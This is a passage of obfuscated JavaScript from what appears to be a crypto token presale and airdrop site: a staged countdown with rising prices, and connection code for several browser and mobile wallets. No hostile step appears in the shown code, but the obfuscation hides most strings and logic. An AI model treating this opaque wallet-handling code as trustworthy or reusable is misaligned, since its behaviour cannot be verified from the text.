_0x529e4e=_0x1bf7bf,_0x21aacb=localStorage[_0x529e4e(0x297)](_0x529e4e(0x234)),_0x21023c=_0x21aacb===_0x529e4e(0xf1)||_0x21aacb===null&&window['matchMedia'](_0x529e4e(0x2c6))[_0x529e4e(0x1e6)];_0x21023c?(document['documentElement'][_0x529e4e(0x192)]['add'](_0x529e4e(0xd2)),document[_0x529e4e(0x26f)](_0x529e4e(0x15b))[_0x529e4e(0x2db)]='☀️'):(document[_0x529e4e(0xe9)][_0x529e4e(0x192)][_0x529e4e(0xaa)](_0x529e4e(0xd2)),document[_0x529e4e(0x26f)]('darkModeIcon')[_0x529e4e(0x2db)]='🌙');const _0x1048a8=document[_0x529e4e(0x26f)]('walletButton');_0x1048a8&&_0x1048a8[_0x529e4e(0x10b)]('click',openWalletModal);const _0x2683c3=localStorage['getItem']('walletAddress'),_0x23caad=localStorage[_0x529e4e(0x297)]('walletConnected'),_0x713775=localStorage[_0x529e4e(0x297)](_0x529e4e(0xe6));if(_0x2683c3&&_0x23caad==='true')try{if(_0x713775===_0x529e4e(0xc3)&&window[_0x529e4e(0xc3)]?.[_0x529e4e(0x1a3)])window[_0x529e4e(0xc3)][_0x529e4e(0x1bf)]&&(userWalletAddress=_0x2683c3,isSolanaWallet=!![],solanaProvider=window['solana'],updateWalletUI(_0x2683c3),console['log'](_0x529e4e(0x224)));else{if(window[_0x529e4e(0xa2)]){const _0x438c3a=await window[_0x529e4e(0xa2)][_0x529e4e(0x90)]({'method':_0x529e4e(0x1f3)});_0x438c3a&&_0x438c3a['length']>0x0&&_0x438c3a[0x0][_0x529e4e(0x2af)]()===_0x2683c3['toLowerCase']()?(userWalletAddress=_0x438c3a[0x0],isSolanaWallet=![],updateWalletUI(_0x438c3a[0x0]),console[_0x529e4e(0x1c9)](_0x529e4e(0x2f1))):(localStorage[_0x529e4e(0x82)](_0x529e4e(0x2dd)),localStorage[_0x529e4e(0x82)](_0x529e4e(0x2e5)),localStorage[_0x529e4e(0x82)](_0x529e4e(0xe6)));}}}catch(_0xbee846){console[_0x529e4e(0x1c9)]('Could\x20not\x20reconnect\x20wallet:',_0xbee846),localStorage[_0x529e4e(0x82)](_0x529e4e(0x2dd)),localStorage[_0x529e4e(0x82)](_0x529e4e(0x2e5)),localStorage[_0x529e4e(0x82)](_0x529e4e(0xe6));}initSolanaConnection();});function updateWalletUI(_0x2d9538){const _0x44a81a=_0x1bf7bf,_0x2c31d8=document[_0x44a81a(0x26f)](_0x44a81a(0x163)),_0x138e76=_0x2d9538['slice'](0x0,0x6)+_0x44a81a(0x19b)+_0x2d9538[_0x44a81a(0x285)](-0x4);_0x2c31d8[_0x44a81a(0x209)]='\x0a\x20\x20\x20\x20\x20\x20<span\x20class=\x22wallet-address-display\x22>'+_0x138e76+_0x44a81a(0x97);const _0x4c128b=document[_0x44a81a(0x26f)](_0x44a81a(0x2e5));_0x4c128b&&(_0x4c128b[_0x44a81a(0x258)]=_0x2d9538);const _0x5197d7=document['getElementById'](_0x44a81a(0xad));if(_0x5197d7){const _0x2797ac=parseFloat(localStorage[_0x44a81a(0x297)](_0x44a81a(0x2ae)+_0x2d9538)||'0');_0x5197d7[_0x44a81a(0x2db)]=_0x2797ac[_0x44a81a(0xc8)](undefined,{'maximumFractionDigits':0x2});}}const FIXED_START_TIME=new Date('2025-11-10T00:00:00Z')[_0x1bf7bf(0x155)]();document[_0x1bf7bf(0x10b)]('DOMContentLoaded',function(){initializeTimer();});function initializeTimer(){const _0xf88885=FIXED_START_TIME;updateTimer(_0xf88885),!presaleInterval&&(presaleInterval=setInterval(()=>updateTimer(_0xf88885),0x3e8));}function updateTimer(_0x488be1){const _0x163385=_0x1bf7bf,_0x5332b6=Date[_0x163385(0x1fb)](),_0x21365e=0xf*0x30*0x3c*0x3c*0x3e8,_0x142f84=_0x488be1+_0x21365e,_0x157eb8=Math[_0x163385(0x189)](0x0,_0x142f84-_0x5332b6),_0x57c171=_0x5332b6-_0x488be1,_0x3d1b2c=0x30*0x3c*0x3c*0x3e8,_0x5bfe17=Math[_0x163385(0x284)](Math[_0x163385(0x28f)](_0x57c171/_0x3d1b2c),0xe),_0x1c5c4d=_0x488be1+(_0x5bfe17+0x1)*_0x3d1b2c,_0x31e668=Math[_0x163385(0x189)](0x0,_0x1c5c4d-_0x5332b6),_0x305633=_0xb40f9e=>{const _0x31017b=_0x163385,_0x5f97af=Math['floor'](_0xb40f9e/(0x18*0x3c*0x3c*0x3e8)),_0x385dda=Math[_0x31017b(0x28f)](_0xb40f9e%(0x18*0x3c*0x3c*0x3e8)/(0x3c*0x3c*0x3e8)),_0x5d9287=Math[_0x31017b(0x28f)](_0xb40f9e%(0x3c*0x3c*0x3e8)/(0x3c*0x3e8)),_0x3901bb=Math[_0x31017b(0x28f)](_0xb40f9e%(0x3c*0x3e8)/0x3e8);return{'days':_0x5f97af['toString']()[_0x31017b(0xbe)](0x2,'0'),'hours':_0x385dda[_0x31017b(0x2d0)]()[_0x31017b(0xbe)](0x2,'0'),'minutes':_0x5d9287[_0x31017b(0x2d0)]()[_0x31017b(0xbe)](0x2,'0'),'seconds':_0x3901bb['toString']()['padStart'](0x2,'0'),'full':_0x5f97af+'d\x20'+_0x385dda+'h\x20'+_0x5d9287+'m\x20'+_0x3901bb+'s'};};if(_0x157eb8<=0x0)document[_0x163385(0x26f)](_0x163385(0x22e))[_0x163385(0x2db)]='00',document[_0x163385(0x26f)]('hours')[_0x163385(0x2db)]='00',document[_0x163385(0x26f)](_0x163385(0xed))[_0x163385(0x2db)]='00',document['getElementById'](_0x163385(0x2ba))[_0x163385(0x2db)]='00',clearInterval(presaleInterval);else{const _0x3d0a39=_0x305633(_0x157eb8);document[_0x163385(0x26f)](_0x163385(0x22e))[_0x163385(0x2db)]=_0x3d0a39[_0x163385(0x22e)],document[_0x163385(0x26f)](_0x163385(0x2a4))[_0x163385(0x2db)]=_0x3d0a39['hours'],document[_0x163385(0x26f)](_0x163385(0xed))[_0x163385(0x2db)]=_0x3d0a39[_0x163385(0xed)],document[_0x163385(0x26f)](_0x163385(0x2ba))['textContent']=_0x3d0a39['seconds'];}document[_0x163385(0x26f)](_0x163385(0x262))[_0x163385(0x2db)]=_0x5bfe17+0x1;const _0x9aadc0=_0x305633(_0x31e668);document[_0x163385(0x26f)]('stage-time-left')[_0x163385(0x2db)]=_0x9aadc0['full'];const _0x5e33ca=0x64-_0x31e668/_0x3d1b2c*0x64,_0x1d3045=(_0x5bfe17+_0x5e33ca/0x64)/0xf*0x64;document['getElementById'](_0x163385(0x283))['style'][_0x163385(0x186)]=_0x1d3045+'%';const _0x281e96=(0.0001*Math[_0x163385(0x13c)](1.05,_0x5bfe17))[_0x163385(0x1c3)](0x6);document[_0x163385(0x26f)](_0x163385(0xf2))['innerHTML']='$'+_0x281e96+_0x163385(0x175)+_0x9aadc0[_0x163385(0x8c)]+_0x163385(0x147);}function resetTimer(){console['warn']('Reset\x20timer\x20is\x20for\x20testing\x20only.\x20Remove\x20in\x20production!'),presaleInterval&&(clearInterval(presaleInterval),presaleInterval=null),initializeTimer();}function openWalletModal(){const _0x149ea4=_0x1bf7bf;document[_0x149ea4(0x26f)](_0x149ea4(0x2b7))[_0x149ea4(0x192)][_0x149ea4(0xd5)](_0x149ea4(0x301));}function closeWalletModal(){const _0x5237b3=_0x1bf7bf;document[_0x5237b3(0x26f)]('walletModal')[_0x5237b3(0x192)][_0x5237b3(0xaa)](_0x5237b3(0x301));}function closeWalletConnectModal(){const _0x1a5bf7=_0x1bf7bf;document[_0x1a5bf7(0x26f)](_0x1a5bf7(0x1c4))[_0x1a5bf7(0x192)][_0x1a5bf7(0xaa)]('active');}function showConnectionHelp(_0x5e32dd,_0x265712){const _0x1b056c=_0x1bf7bf;_0x265712[_0x1b056c(0x205)](),closeWalletModal();let _0x2c32e3,_0x3f608b;switch(_0x5e32dd){case _0x1b056c(0x217):_0x2c32e3=_0x1b056c(0x177),_0x3f608b='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-title\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-icon-wrapper\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-fox\x20help-icon\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>MetaMask\x20Connection\x20Guide</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-desktop\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Browser\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Install\x20the\x20MetaMask\x20extension\x20for\x20Chrome,\x20Firefox,\x20Brave,\x20or\x20Edge</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Create\x20a\x20new\x20wallet\x20or\x20import\x20an\x20existing\x20one</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Click\x20\x22Connect\x20Wallet\x22\x20on\x20our\x20site\x20and\x20select\x20MetaMask</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20the\x20MetaMask\x20popup</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Your\x20wallet\x20address\x20will\x20appear\x20when\x20connected</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22help-platform\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22platform-icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<i\x20class=\x22fas\x20fa-mobile-alt\x22></i>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Mobile\x20Instructions</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<ol\x20class=\x22help-steps\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Install\x20the\x20MetaMask\x20app\x20from\x20your\x20app\x20store</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Open\x20our\x20website\x20in\x20the\x20MetaMask\x20in-app\x20browser</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Tap\x20\x22Connect\x20Wallet\x22\x20and\x20select\x20MetaMask</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>Approve\x20the\x20connection\x20request\x20in\x20the\x20app</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<li>For\x20direct\x20connection,\x20open\x20our\x20site\x20via\x20MetaMask\x20browser</li>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</ol>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';break;case _0x1b056c(0xe5):_0x2c32e3=_0x1b056c(0x1ff),_0x3f608b=_0x1b056c(0x219);break;case'walletconnect':_0x2c32e3=_0x1b056c(0xe7),_0x3f608b=_0x1b056c(0x2cc);break;case _0x1b056c(0x23a):_0x2c32e3=_0x1b056c(0x1bc),_0x3f608b=_0x1b056c(0x107);break;}document['getElementById'](_0x1b056c(0x248))['innerHTML']=_0x3f608b,document['getElementById'](_0x1b056c(0x8b))[_0x1b056c(0x192)]['add'](_0x1b056c(0x301));}function closeHelpModal(){const _0x2e63dd=_0x1bf7bf;document[_0x2e63dd(0x26f)](_0x2e63dd(0x8b))['classList'][_0x2e63dd(0xaa)](_0x2e63dd(0x301));}async function connectWallet(_0x273de3){const _0x136a9a=_0x1bf7bf;try{closeWalletModal();const _0x1399f3=document[_0x136a9a(0x26f)](_0x136a9a(0x2d7)),_0x162131=_0x1399f3[_0x136a9a(0x209)];_0x1399f3[_0x136a9a(0x209)]=_0x136a9a(0xcd),_0x1399f3[_0x136a9a(0x2f8)]=!![];if(_0x273de3===_0x136a9a(0x217))await connectMetaMask();else{if(_0x273de3===_0x136a9a(0xe5))await connectTrustWallet();else{if(_0x273de3===_0x136a9a(0x2c4))await connectWalletConnect();else _0x273de3===_0x136a9a(0x23a)&&await connectPhantom();}}}catch(_0x286955){console['error'](_0x136a9a(0x1b1),_0x286955),showNotification(_0x136a9a(0x2d8)+_0x286955[_0x136a9a(0xc5)],'error');}finally{setTimeout(()=>{const _0x4d18b7=_0x136a9a,_0x2d29ec=document[_0x4d18b7(0x26f)](_0x4d18b7(0x2d7));_0x2d29ec&&!userWalletAddress&&(_0x2d29ec[_0x4d18b7(0x209)]=_0x4d18b7(0x2f4),_0x2d29ec[_0x4d18b7(0x2f8)]=![]);},0x7d0);}}async function connectMetaMask(){const _0x8a6dfd=_0x1bf7bf;if(isMobile()){const _0x340ea9=window[_0x8a6dfd(0xa2)]&&window['ethereum'][_0x8a6dfd(0x1aa)];if(_0x340ea9)try{const _0x268ad2=await window[_0x8a6dfd(0xa2)][_0x8a6dfd(0x90)]({'method':'eth_requestAccounts'});handleWalletConnection(_0x268ad2[0x0]),window['ethereum']['on'](_0x8a6dfd(0xb2),_0x5108f4=>{const _0x42cea2=_0x8a6dfd;_0x5108f4[_0x42cea2(0x185)]===0x0?disconnectWallet():handleWalletConnection(_0x5108f4[0x0]);});return;}catch(_0x3d68f9){console[_0x8a6dfd(0x1dd)](_0x8a6dfd(0x233),_0x3d68f9),showNotification(_0x8a6dfd(0x1df)+_0x3d68f9[_0x8a6dfd(0xc5)],'error');return;}const _0x50675c=window['location'][_0x8a6dfd(0x194)];!_0x50675c[_0x8a6dfd(0x21a)]('metamask')&&(window[_0x8a6dfd(0x123)][_0x8a6dfd(0x194)]=_0x8a6dfd(0x201)+window['location']['host']+window[_0x8a6dfd(0x123)][_0x8a6dfd(0x1e5)]);}else{if(window[_0x8a6dfd(0xa2)]&&window[_0x8a6dfd(0xa2)][_0x8a6dfd(0x1aa)]){const _0x19b340=await window[_0x8a6dfd(0xa2)][_0x8a6dfd(0x90)]({'method':_0x8a6dfd(0x29d)});handleWalletConnection(_0x19b340[0x0]),window['ethereum']['on']('accountsChanged',_0x42796b=>{_0x42796b['length']===0x0?disconnectWallet():handleWalletConnection(_0x42796b[0x0]);});}else throw new Error(_0x8a6dfd(0x22a));}}async function connectTrustWallet(){const _0x1e03e1=_0x1bf7bf;if(isMobile()){if(window['ethereum']&&window['ethereum'][_0x1e03e1(0x151)])try{const _0x252796=await window[_0x1e03e1(0xa2)][_0x1e03e1(0x90)]({'method':_0x1e03e1(0x29d)});handleWalletConnection(_0x252796[0x0]);}catch(_0x3357ce){window[_0x1e03e1(0x123)][_0x1e03e1(0x194)]=_0x1e03e1(0x1d2)+encodeURIComponent(window[_0x1e03e1(0x123)][_0x1e03e1(0x194)]);}else window[_0x1e03e1(0x123)]['href']='https://link.trustwallet.com/open_url?coin=60&url='+encodeURIComponent(window[_0x1e03e1(0x123)]['href']);}else{if(window[_0x1e03e1(0xa2)]&&window[_0x1e03e1(0xa2)][_0x1e03e1(0x151)])try{const _0x512691=await window['ethereum'][_0x1e03e1(0x90)]({'method':_0x1e03e1(0x29d)});handleWalletConnection(_0x512691[0x0]);}catch(_0x228745){throw new Error(_0x1e03e1(0x281));}else throw new Error(_0x1e03e1(0xe0));}}async function connectWalletConnect(){const _0x308815=_0x1bf7bf;try{typeof WalletConnect===_0x308815(0x2ac)&&await loadWalletConnectLibrary();const _0x25aea4=new WalletConnect({'bridge':_0x308815(0x221),'qrcodeModal':{'open':_0x388a17=>{openWalletConnectModal(_0x388a17);},'close':()=>{closeWalletConnectModal();}}});if(!_0x25aea4[_0x308815(0xda)])await _0x25aea4[_0x308815(0x226)]();else{const _0x14a1d4=_0x25aea4[_0x308815(0x25a)];if(_0x14a1d4&&_0x14a1d4[_0x308815(0x185)]>0x0){handleWalletConnection(_0x14a1d4[0x0]);return;}}_0x25aea4['on'](_0x308815(0x27e),(_0x5acc86,_0x554815)=>{const _0x42ff73=_0x308815;if(_0x5acc86)throw _0x5acc86;closeWalletConnectModal();const {accounts:_0x20effb}=_0x554815['params'][0x0];handleWalletConnection(_0x20effb[0x0]),showWalletError(_0x42ff73(0x159),'success');}),_0x25aea4['on'](_0x308815(0x126),(_0x42d59a,_0x523093)=>{const _0x45e4b0=_0x308815;if(_0x42d59a)throw _0x42d59a;const {accounts:_0x38d36c}=_0x523093[_0x45e4b0(0x1d0)][0x0];handleWalletConnection(_0x38d36c[0x0]);}),_0x25aea4['on'](_0x308815(0x290),(_0x5d8d3a,_0x92eddf)=>{if(_0x5d8d3a)throw _0x5d8d3a;_0x25aea4=null,disconnectWallet();}),window[_0x308815(0x94)]=_0x25aea4;}catch(_0x1e1d09){console['error']('WalletConnect\x20error:',_0x1e1d09),showWalletConnectFallback();}}async function loadWalletConnectLibrary(){return new Promise((_0xccf395,_0x4053b6)=>{const _0x53c55f=_0x38e3;if(typeof WalletConnect!==_0x53c55f(0x2ac)){_0xccf395();return;}const _0x2a7d46=document[_0x53c55f(0x2c9)](_0x53c55f(0x120));_0x2a7d46[_0x53c55f(0x2b8)]=_0x53c55f(0x27a),_0x2a7d46[_0x53c55f(0x81)]=_0xccf395,_0x2a7d46[_0x53c55f(0x23f)]=_0x4053b6,document[_0x53c55f(0xdf)]['appendChild'](_0x2a7d46);});}function openWalletConnectModal(_0x33d40f){const _0x24aec2=_0x1bf7bf,_0x5b9b33=document['getElementById'](_0x24aec2(0x28c));_0x5b9b33[_0x24aec2(0x209)]='';try{typeof QRCode!=='undefined'?new QRCode(_0x5b9b33,{'text':_0x33d40f,'width':0xc8,'height':0xc8,'colorDark':_0x24aec2(0xd4),'colorLight':_0x24aec2(0x2f6),'correctLevel':QRCode[_0x24aec2(0x9d)]['H']}):_0x5b9b33[_0x24aec2(0x209)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22width:\x20200px;\x20height:\x20200px;\x20background:\x20white;\x20border:\x202px\x20solid\x20#ccc;\x20display:\x20flex;\x20align-items:\x20center;\x20justify-content:\x20center;\x20font-size:\x2012px;\x20text-align:\x20center;\x20padding:\x2010px;\x20border-radius:\x208px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22margin-bottom:\x2010px;\x22>📱\x20Scan\x20with\x20WalletConnect</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:\x2010px;\x20color:\x20#666;\x20word-break:\x20break-all;\x20max-width:\x20180px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x33d40f['substring'](0x0,0x32)+'...\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22copyWalletConnectUri(\x27'+_0x33d40f+_0x24aec2(0xbd);const _0xeb0cc4=document[_0x24aec2(0x26f)]('walletConnectLink');_0xeb0cc4&&(_0xeb0cc4[_0x24aec2(0x192)][_0x24aec2(0xaa)](_0x24aec2(0xca)),_0xeb0cc4[_0x24aec2(0x209)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22text-align:\x20center;\x20margin-top:\x2015px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20style=\x22font-size:\x2014px;\x20color:\x20#6b7280;\x20margin-bottom:\x2010px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Don\x27t\x20have\x20a\x20wallet?\x20Download\x20one:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22display:\x20flex;\x20gap:\x2010px;\x20justify-content:\x20center;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22window.open(\x27https://metamask.io/download/\x27,\x20\x27_blank\x27)\x22\x20style=\x22padding:\x208px\x2012px;\x20background:\x20#f6851b;\x20color:\x20white;\x20border:\x20none;\x20border-radius:\x206px;\x20cursor:\x20pointer;\x20font-size:\x2012px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20MetaMask\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22window.open(\x27https://trustwallet.com/\x27,\x20\x27_blank\x27)\x22\x20style=\x22padding:\x208px\x2012px;\x20background:\x20#3375bb;\x20color:\x20white;\x20border:\x20none;\x20border-radius:\x206px;\x20cursor:\x20pointer;\x20font-size:\x2012px;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Trust\x20Wallet\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20');}catch(_0x3e66fa){console[_0x24aec2(0x1dd)](_0x24aec2(0x2b6),_0x3e66fa),_0x5b9b33[_0x24aec2(0x209)]=_0x24aec2(0x19c)+encodeURIComponent(_0x33d40f)+_0x24aec2(0x146)+encodeURIComponent(_0x33d40f)+'\x27,\x20\x27_blank\x27)\x22\x20style=\x22padding:\x2010px;\x20background:\x20#3375bb;\x20color:\x20white;\x20border:\x20none;\x20border-radius:\x208px;\x20cursor:\x20pointer;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Open\x20in\x20Trust\x20Wallet\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20';}document[_0x24aec2(0x26f)](_0x24aec2(0x1c4))[_0x24aec2(0x192)][_0x24aec2(0xd5)](_0x24aec2(0x301));}function copyWalletConnectUri(_0x586435){const _0x10c201=_0x1bf7bf;navigator[_0x10c201(0x2fd)]['writeText'](_0x586435)[_0x10c201(0x1ed)](()=>{const _0x122725=_0x10c201;showWalletError('WalletConnect\x20URI\x20copied\x20to\x20clipboard!',_0x122725(0x2fc));})['catch'](()=>{const _0x337c81=_0x10c201,_0x20aa37=document['createElement'](_0x337c81(0x14c));_0x20aa37[_0x337c81(0x258)]=_0x586435,document[_0x337c81(0x256)][_0x337c81(0x14f)](_0x20aa37),_0x20aa37[_0x337c81(0x260)](),document['execCommand'](_0x337c81(0x225)),document[_0x337c81(0x256)]['removeChild'](_0x20aa37),showWalletError(_0x337c81(0x127),_0x337c81(0x2fc));});}function showWalletConnectFallback(){const _0x598f3c=_0x1bf7bf,_0x71860d=document[_0x598f3c(0x26f)](_0x598f3c(0x1c4)),_0xeed1e2=document[_0x598f3c(0x26f)]('walletConnectQrCode');_0xeed1e2[_0x598f3c(0x209)]='';const _0x5b9491=document[_0x598f3c(0x2c9)](_0x598f3c(0x1da));_0x5b9491[_0x598f3c(0x209)]=_0x598f3c(0x2cb),_0xeed1e2[_0x598f3c(0x14f)](_0x5b9491),_0x71860d[_0x598f3c(0x192)]['add'](_0x598f3c(0x301));}async function disconnectWallet(){const _0x191324=_0x1bf7bf;if(window[_0x191324(0x94)]&&window[_0x191324(0x94)][_0x191324(0xda)]){try{await window[_0x191324(0x94)][_0x191324(0xcf)]();}catch(_0x1a4819){console['error'](_0x191324(0x158),_0x1a4819);}window[_0x191324(0x94)]=null;}userWalletAddress=null,isSolanaWallet=![],solanaProvider=null;const _0x31a700=document[_0x191324(0x26f)](_0x191324(0x163));_0x31a700[_0x191324(0x209)]=_0x191324(0x193);const _0xba377d=document[_0x191324(0x26f)]('walletButton');_0xba377d&&_0xba377d[_0x191324(0x10b)](_0x191324(0x191),openWalletModal);const _0x289cdd=document[_0x191324(0x26f)](_0x191324(0x2e5));_0x289cdd&&(_0x289cdd[_0x191324(0x258)]='');localStorage[_0x191324(0x82)](_0x191324(0x2dd)),localStorage[_0x191324(0x82)](_0x191324(0x2e5));const _0x590791=document['getElementById'](_0x191324(0xfb));_0x590791&&_0x590791['classList']['add'](_0x191324(0xca));const _0x20a343=document[_0x191324(0x238)]('#airdropForm\x20button[type=\x22submit\x22]');_0x20a343&&(_0x20a343[_0x191324(0x2f8)]=![],_0x20a343[_0x191324(0x192)][_0x191324(0xaa)](_0x191324(0x1b2),_0x191324(0x20b))),showWalletError('Wallet\x20disconnected',_0x191324(0x2fc));}function openWalletConnectModal(_0x5e1176){const _0x1c95cc=_0x1bf7bf,_0x3987c5=document[_0x1c95cc(0x26f)](_0x1c95cc(0x28c));_0x3987c5['innerHTML']='\x0a\x20\x20\x20\x20<div\x20style=\x22width:\x20200px;\x20height:\x20200px;\x20background:\x20white;\x20border:\x202px\x20solid\x20#ccc;\x20display:\x20flex;\x20align-items:\x20center;\x20justify-content:\x20center;\x20font-size:\x2012px;\x20text-align:\x20center;\x20padding:\x2010px;\x20border-radius:\x208px;\x22>\x0a\x20\x20\x20\x20\x20\x20<div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22margin-bottom:\x2010px;\x22>📱\x20QR\x20Code</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22font-size:\x2010px;\x20color:\x20#666;\x20word-break:\x20break-all;\x22>'+_0x5e1176+_0x1c95cc(0xb1),document[_0x1c95cc(0x26f)](_0x1c95cc(0x1c4))[_0x1c95cc(0x192)][_0x1c95cc(0xd5)](_0x1c95cc(0x301));}async function connectBinanceWallet(){const _0xdfce3f=_0x1bf7bf;try{closeWalletConnectModal();if(window[_0xdfce3f(0xc2)]){const _0x343b37=await window['BinanceChain']['request']({'method':_0xdfce3f(0x29d)});handleWalletConnection(_0x343b37[0x0]);}else{if(window[_0xdfce3f(0xa2)]&&window[_0xdfce3f(0xa2)]['isBinance']){const _0x38c561=await window[_0xdfce3f(0xa2)][_0xdfce3f(0x90)]({'method':_0xdfce3f(0x29d)});handleWalletConnection(_0x38c561[0x0]);}else showNotification('Binance\x20Wallet\x20not\x20detected.\x20Opening\x20download\x20page...','info'),setTimeout(()=>{const _0x53043e=_0xdfce3f;window[_0x53043e(0x21f)](_0x53043e(0x14e),'_blank');},0x5dc);}}catch(_0x4726f5){showNotification('Failed\x20to\x20connect\x20Binance\x20Wallet:\x20'+_0x4726f5[_0xdfce3f(0xc5)],_0xdfce3f(0x1dd));}}async function connectPhantom(){const _0x24293b=_0x1bf7bf;try{if(typeof window['solana']===_0x24293b(0x2ac)||!window[_0x24293b(0xc3)][_0x24293b(0x1a3)]){isMobile()?window['location'][_0x24293b(0x194)]=_0x24293b(0x149)+encodeURIComponent(window[_0x24293b(0x123)]['href'])+_0x24293b(0x1b6)+encodeURIComponent(window[_0x24293b(0x123)][_0x24293b(0x2ef)]):(showNotification(_0x24293b(0x2d3),_0x24293b(0x1dd)),window[_0x24293b(0x21f)](_0x24293b(0x23d),'_blank'));return;}isSolanaWallet=!![];const _0x4e199e=await window[_0x24293b(0xc3)][_0x24293b(0x27e)](),_0x5a5999=_0x4e199e[_0x24293b(0x2f3)][_0x24293b(0x2d0)]();solanaProvider=window[_0x24293b(0xc3)],!solanaConnection&&initSolanaConnection(),handleWalletConnection(_0x5a5999),window[_0x24293b(0xc3)]['on'](_0x24293b(0x288),_0x27155a=>{const 